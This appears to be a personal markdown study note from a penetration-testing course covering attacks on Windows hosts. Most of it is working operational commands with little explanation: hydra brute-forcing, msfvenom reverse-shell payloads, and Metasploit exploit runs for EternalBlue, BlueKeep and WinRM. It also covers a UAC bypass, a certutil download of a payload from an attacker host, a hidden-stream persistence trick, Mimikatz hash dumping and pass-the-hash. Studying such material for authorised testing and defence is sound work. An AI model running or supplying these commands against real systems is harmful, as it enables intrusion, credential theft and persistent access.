---
id: 43li3n94zkebythpty2jeu9
title: Windows_host_based_attacks
desc: ''
updated: 1675114240646
created: 1675114232580
---
# Windows: System/Host based Attacks

Windows and Linux operating system attack are covered

Why are these important?
- Host based attack often serve as initial attack vectors that can give you access to the network
- Operating systems are usually easy to misconfigure
- Many times target machines are not running remote services like HTTP, SSH, FTP etc, so host based attacks will serve as the only point of entry

Windows Vulnerabilities

* Windows threat landscape is fragmented, it usually depends on the version of windows. 
* Windows is a prime target because there are many companies running older windows versions
* Vuln types affecting windows
    * Information disclosure
    * Buffer overflow
    * Remote code execution
    * Privilege Escalation
    * Denial of Service (Dos)

Frequently Exploited Windows Services

![frequently_exploited_services](assets/images/windows_host_based_attacks/Frequently%20Exploited%20Windows%20Services.png)

## Exploiting WebDAV

* Runs on IIS server
* WebDav is file server, allowing file sharing
* Runs on 80/443
* WebDav is typically protected by authentication
    * Bruteforcing the auth is a good way to get access to webDav

### Exploiting webdav with davtest and cadaver

* Initial fingerprinting and access:
    * nmap 10.3.16.188 -sV -O -sC (runs all relevant scripts and initial fingerprinting)
    * nmap 10.3.16.188 -p 80 --script http-enum (performs directory traversal and finds interesting folders, ex: /webdav/)
    * hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.3.16.188 http-get /webdav/ (Bruteforcing webdav)
* Post access discovery
    * davtest -auth bob:password_123321 -url http://10.3.16.188/webdav
        * Runs varies operations to see what operations and file types are supported
* Exploitation
    * Kali comes pre packaged with webshells: ls -al /usr/share/webshells/
    * Cadaver : lets you login to webdav and execute CRUD operations on files
        * On cadaver console
            * Upload a web shell: put /usr/share/webshells/asp/webshell.asp
    * Navigate to the uploaded web shell to run commands

### Exploit Webdav with Metasploit

* Option 1: construct you payload (stager) and upload it manually to webdav using cadaver
    * msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.20.4 LPORT=1234 -f asp > meterpreter.asp
    * Login using cadaver and upload the meterpreter.asp: put /root/meterpreter.asp
    * Setup a listening post
        * Msfconsole -> use multi/handler -> set LHOST <self_ip> -> LPORT <port> (The Lhost and port should be same as the value set in stager)
        * Run (start) listening
    * Open browser -> login to webdav -> locate meterpreter.asp -> run
    * The meterpreter will receive connection and start a reverse shell
* Option 2: Use automated metasploit exploits to perform all the tasks
    * Msfconsole -> search IIS upload
    * use exploit/windows/iis/iis_webdav_upload_asp -> set lhost <self_ip> -> set lport <custom port> -> set rhost <target> -> set httpusername <webdav user> -> set httppassword <webdav password>
    * Run —> meterpreter reverse shell


## Exploiting SMB with PSexec

* SMB is a file share
* Samba is a open source implementation of SMB, used by linux systems
![smb_auth](assets/images/windows_host_based_attacks/SMB%20Authentication.png)

* SMB Auth ^
* PsExec
    * A lightweight telnet replacement
    * Non gui environment that can be used to run processes on remote machines
* Bruteforce to get credentials
    * Msfconsole; use auxiliary/scanners/smb/smb_login; set hosts <>; set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt; set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; run
* Psexec.py
    * psexec.py Administrator@10.3.26.229 cmd.exe
        * Enter password
        * This will instantiate a cmd window

## Exploiting Windows MS17-010 SMB Vulnerability (Eternal Blue)

* CVE-2017-0144
* Gives RCE on Windows by exploiting SMB
* Used by wanna cry ransomeware group
* Tools:
    * Autoblue-MS17-010 : gitthub.com/3ndG4me/AutoBlue-MS17-010
    * Kali linux
* Service discovery
    * Nmap -sV -p 445 -O target_ip
* Vulnerability detection
    * Nmap -sV -p 445 —script sm-vuln-ms17-010 target_ip
* Option: Manual exploitation
    * Use AutoBlue
        * ./shell_prep.sh
            * Generate reverse shell with msfvenom
        * Follow prompts
    * Start listening on port 1234 (Listening post)
        * Nc -nvlp 1234
    * ./eternalblue_exploit7.py target_ip shell code/sc_x64.bin
    * Successful execution will open a cmd shell on listening post
* Option 2: Automated using metasploit
    * You can check if the target is vulnerable using auxiliary module, search for eternalblue
    * Use windows/smb/ms17_010_eternalblue
        * Set lhosts; set lport; set hosts target
        * Run
    * Gets a meterpreter session

## Exploiting RDP
* Service detection
    * Nmap -sV target
* In case RDP not running on standard port
    * You can manually connect and check if the service is running on desired port
    * Or metasploits auxiliary/scanner/rdp/rdp_scanner can be used to detect rap service
* Brute force creds
    * Hydra -L /usr/share/metasploit-framework/data/wordlists/common_user.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://target_ip -s <port>

## Exploit windows CVE-2019-0708 RDP Vulnerability (BlueKeep)

* Allows RCE by exploit RDP protocol
    * Unauthorized access to kernel memory
    * Since kernel is used, the resulting RCE will be privileged
* A lot of proof of concept for this CVE are actually malicious , so be careful. Only use verified exploits
* Perform service detection to verify the details on the target
* Metasploit
    * Search bluekeep
    * There are two options: auxiliary & the exploit
    * Use auxiliary/scanner/rdp/cve_2019_0708_BlueKeep; set rhosts; run
        * Tells if the target is vulnerable
    * Use exploit/windows/rdp/cve_2019_0708_BlueKeep_rce; ret rhosts; show targets; set target 2; exploit
        * Since this exploit uses a kernel exploit, there are high chances that it crashes the target system, so be careful
        * If successful will get you a elevated meterpreter session

## Exploiting WinRM

* Windows Remote management protocol
    * Manage systems over HTTPs
    * Runs on 5985 (HTTP) or 5986 (HTTPS)
    * Usually protected by Authentication
* Tools
    * crackmapexec
    * Evil-winrm.rb
    * Metasploit
* Service detection, nmap default 1000 ports does include winRM, so it has to be explicitly provided
    * Nmap -sV -p 5985,5986 target_ip
* To exploit winRM, valid credentials are required
* Bruteforce creds
    * crackmapexec winery target_ip -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_password.txt 
* After creds are achieved, commands can be executed directly by crackmapexec
    * crackmapexec winrm 10.3.29.181 -u administrator -p tinkerbell -x "whoami"
* A cmd shell can be achieved by using evil-winrm.rb
    * evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.3.29.181
* Metasploit has exploits for winRM as well
    * Search winRM
    * Use exploit/windows/winrm/winrm_script_exec; set rhosts; set username; set password; set force_vbs true; exploit
    * The above will get you a meterpreter session



## Privilege Escalation on Windows

Elevate user permission to gain privileged administrator access.

### Windows kernel exploits

* Windows NT - Kernel
    * User mode
    * Kernel mode: unrestricted access
* Tools
    * https://github.com/AonCyberLabs/Windows-Exploit-Suggester
    * https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135 
* Demo:
    * The user already has meterpreter session with a non privileged user
    * Meterpreter has an inbuilt privilege escalation cmd
        * Getsystem
    * Metasploit 
        * Search suggester
        * Use post/multi/recon/local_exploit_suggester (can be used for linux as well)
        * Set session; run
        * Will suggest all the privilege escalation/post exploitation modules that can be run on a system
    * Windows-Exploit-suggester
        * This tool needs systeminfo  cmd output from target system (means, we need access to windows as a prerequisite)
        * After running, this will suggest a list of exploits that are applicable for the target host
    * Windows-kernel-exploits
        * Upload the exploit through meterpreter
        * Open a shell
        * Run the exploit on target, the shell will be elevated to privileged user

### Bypassing UAC with UACMe

* User account control
* UAC allows users/programs to “Run As Administrator”
* UAC is responsible for the security prompt which appears before making any privileged actions ex: installs apps, do you really want to install this?
* UAC can be configured based on levels
    * If UAC is set to a level below high, programs can execute privileged actions without the UAC prompt
* Tool
    * https://github.com/hfiref0x/UACME 
* Demo:
    * Service detection with nmap: nmap -sV target_ip
    * There is a file server running on port 80
    * Open on loading the app on browser, a rejetto file server
    * Msfconsole has an exploit for rejetto file server
    * Upon running the exploit, a meterpreter session
* Privilege escalation
    * Create a new payload using msfvenom
        * msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.20.3 lport=1234 -f exe > backdoor.exe
    * Upload the new payload to target machine using the existing meterpreter session obtained through fileserver exploit
    * Upload akagi64.exe binary to the target system, this can be generated by following instructions in UACME git repo
    * Start listening on msfconsole using 
        * Use multi/handler; set host; lport; run (should be the same as msfvenom payload)
    * Execute the Akagi64.exe on target with the meterpreter payload
        * First identify the exploit to run by going through the README on UACME
        * Execute .\Akagi64.exe <mod> <payload.exe>
        * This will open a privileged meterpreter session on the listening post

### Access Token Impersonation

* Local Security Authority Subsystem Service (LSASS) manages access tokens
* Created after login, winlogon.exe creates access token
    * Access token are tied to user identity and their respective privileges
* Will be assigned one of the following security levels
    * Impersonate level tokens: Created after non interactive logins, ex: through system services or domain logons
        * Can only used on local systems
    * Delegate level tokens: created after interactive logins, ex: login screen, RDP session etc 
        * Can be used on any remote system recognizing that login
* Impersonation attacks will make use of following priveleges
    * SeAssignPrimaryToken
    * SeCreateToken
    * SeImpersonatePrivilege
* Lab 
    * Exploitation
        * The given target is vulnerable to rejetto file server exploit. So exploit that using msfconsole
            * Search reject; use 0; set rhosts; run
        * This will give you a meterpreter session
    * Privilege escalation
        * The privilege escalation will be achieved through Access token impersonation
        * Metasploit has an inbuilt module “incognito”
            * load incognito -> will load the module
            * list_tokens -u -> will list all the available tokens for impersonation
            * impersonate_token "ATTACKDEFENSE\Administrator" —> will perform the impersonation
        * Edge cases
            * In case “list_tokens” doesn’t show any active tokens, the privilege escalation can be done by create a SYSTEM token and then impersonating it. This is done through potato attack (google for more information)

### Windows file system vulnerabilities - Alternate Data Streams

* ADS is an NTFS file attribute, was designed to provide compatibility in Mac OS
* NTFS files always have two forks/streams
    * Data Stream: contains data
    * Resource stream: contains metadata
* Malicious code can be hidden inside resource stream to evade detection
* Demo (no lab)
    * Open cmd.exe
    * Normal file creation
        * notepad test.txt
        * Right click on the file and open properties, this is the resource stream
    * Malicious file creation
        * Notepad text.tct:secret.txt
        * Notepad complains that file doesn’t exist, click create file
        * This way you can keep hidden content in resource stream of a file
    * Demo Malicious
        * winPEAS64 (This is the tool/payload)
        * Type payload.exe > windowsLog.txt:winpeas.exe (windowsLog.txt can be any file)
        * Start windowsLog.txt:winpeas.exe (access denied error)
        * Mklink wupdate.exe C:\temp\windowsLog.txt:windpeas.exe
            * Needs administrator access
            * So whenever windows update executes, winpeas.exe will be executed


## Windows Credential Dumping

### Windows password Hashes

* Windows stores user account password in SAM (Security Accounts Manager) database
* Windows has two different types of hashes
    * LM (This is legacy, only used by windows vista and older)
    * NTLM 
* SAM database cannot be copied while OS is running
* Hash dumping involves manipulate in memory SAM database file by interacting LSASS process
* NTLM Hash uses md4 algo for hashing and don’t have salt for randomization …WOW

### Searching for passwords in windows configuration files

* Configuration files are used for unattended windows setup (userdata)
    * Credentials might be present in these configuration files, provided the Administrator has not deleted this file after setup
    * Config files can be typically found in:
        * C:\Windows\Panther\Unattend.xml
        * C:\Windows\Panther\Autounattend.xml
    * Passwords stored in these file might be base64 encoded
* Demo
    * Kali Host:
        * Generate payload using msfvenom
            * msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.9.3 LPORT=1234 -f exe > payload.exe
        * Host a Simple Callback server
            * Python -m SimpleHTTPServer 80
                * Should be in the same folder as the payload.exe
        * Start listening on msfconsole
            * Use multi/handler; set payload; set lhost; set lport
        * Look for the configuration files
            * Option 1: search -f unattend.xml
            * Option 2: manually browse the C:\Windows\Panther\ and look for unattend.xml or autounattend.xml
        * Download the unattend.xml, look for password in the file
        * Base64 -d password.txt
        * Test the credentials using psexec.py
            * psexec.py Administrator@target_ip
                * Enter password
    * Victim Host
        * Download the payload
            * Certutil -urlcache -f http://attacker_ip/payload.exe payload.exe
        * Execute the payload.exe by double clicking
        * This should start a meterpreter session on Attacker Host

### Dumping hashes with Mimikatz

Mimikatz is the a very powerful post exploitation tool used for windows

* Option 1: load mimikatz binary to windows and interact with it
    * From meterpreter —> upload /usr/share/windows-resources/x64/mimikatz.exe (verify path)
    * Run the mimikats binary from cmd shell
* Option 2: use Kiwi module in meterpreter, this loads mimikatz in msfconsole, this doesn’t require loading a binary on to victim machine
    * Load kiwi from meterpreter; use kiwi cmds; ex: lsa_dump_sam will dump all hashes
* Dumping hashes will require privileged access


### Pass the Hash Attack

* Pass the hash exploitation technique can be used to harvest and authenticate into windows systems legitimately
* Tools
    * Metasploit psexec module
    * crackmapexec
* This will use legitimate auth with SMB
* This is a persistence technique allowing access to victim even if it is patched
* Option 1: Open msfconsole
    * Harvest NTLM hashes by following above steps
    * This attack needs both LM and NTLM hashes
    * hashdump
        * This will dump all LM hashes along with NTLM hashes
            * Format user:rid:lm_hash:ntlm_hash
            * lm_hash is same for all users
    * Send meterpreter to background using ctrl+z
    * Use exploit/windows/smb/psexec
    * Set rhosts; set lport: set SMBUser; set SMBPass lm_hash:ntlm_hash; exploit
        * If meterpreter session is not returned
        * Try changing the target
            * Show target -> lists all the available target
            * Use a different one
            * The demo video used the set target Native\ upload to get a success result
* Option 2: crackmapexec smb target_ip -u user -h ntlm_hash -x “whoami”
